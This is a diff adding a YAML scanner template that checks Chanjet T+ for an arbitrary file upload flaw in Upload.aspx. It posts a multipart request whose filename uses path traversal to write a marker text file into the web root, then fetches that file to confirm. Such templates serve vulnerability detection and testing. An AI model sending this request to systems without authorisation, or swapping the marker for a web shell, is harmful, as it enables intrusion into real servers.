@@ -1,0 +1,26 @@
+name: yonyou-chanjet-tplus-file-upload
+rules:
+  r0:
+    request:
+      method: POST
+      path: /tplus/SM/SetupAccount/Upload.aspx?preload=1
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVXR9biLu
+      body: "\
+        ------WebKitFormBoundaryVXR9biLu\r\n\
+        Content-Disposition: form-data; name=\"File1\"; filename=\"../../../../../../../Program Files (x86)/Chanjet/TPlusStd/WebSite/{{r1}}.txt\"\r\n\
+        Content-Type: image/jpeg\r\n\
+        \r\n\
+        a1f1r1o1g1\r\n\
+        ------WebKitFormBoundaryVXR9biLu--\r\n\
+        "
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /tplus/{{r1}}.txt?preload=1
+    expression: response.body.bcontains(b'a1f1r1o1g1')
+expression: r0() && r1()
+detail:
+    links:
+      - 畅捷通T+ Upload.aspx 任意文件上传
